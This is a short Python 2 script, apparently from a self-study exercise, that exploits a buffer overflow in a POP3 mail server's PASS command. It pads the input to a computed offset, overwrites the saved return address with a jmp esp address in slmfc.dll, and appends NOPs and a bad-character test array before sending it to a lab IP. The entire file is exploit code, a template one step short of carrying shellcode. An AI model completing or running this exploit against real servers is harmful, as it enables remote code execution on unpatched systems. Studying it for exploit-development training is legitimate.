#!/usr/bin/env python
# cccgoe 02.06.2015 - buffer overflow exploitation basics
# sending a unique pattern to determine the exact offset to overwrite stored EIP on the stack

#import socket library
import socket

# AF_INET = IPv4, SOCK_STREAM = TCP, SOCK_DGREAM = UDP
# See http://openbook.galileocomputing.de/python/python_kapitel_20_001.htm
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# padding to reach EIP offset
padding = 'A' * 2606

# overwrite saved EIP with address to jmp esp instruction in slmfc.dll at 5F4A358F ---little endian---> \x8f\x35\x4a\x5f
EIP = '\x8f\x35\x4a\x5f'

# place NOP's in exploit variable for demonstration purposes
nop = '\x90' * 10

#badchars = \x00\x0a\x0d
# \x00 = stringterminator
# \x0a = linefeed
# \x0f = carriage return
# put all possibilities from x01 - xff into an array and remove
# charachters one by one until you see xff in the debugger dump

#badchar pattern, badchars from above already removed
badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e"
badchars += "\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d"
badchars += "\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c"
badchars += "\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b"
badchars += "\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a"
badchars += "\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59"
badchars += "\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68"
badchars += "\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77"
badchars += "\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86"
badchars += "\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95"
badchars += "\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4"
badchars += "\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3"
badchars += "\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
badchars += "\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1"
badchars += "\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
badchars += "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
badchars += "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe"
badchars += "\xff"

buffer = padding + EIP + nop + badchars


#try-except schleife um einen sauberen programmverlauf zu gewaehrleisten
try:
	print '\nSending buffer...'
	s.connect (('10.0.0.20',110))
	data=s.recv(1024)
	s.send('User test' + '\r\n')
	data=s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print '\n Done!'
except:
	print 'Could not connect to POP3!'


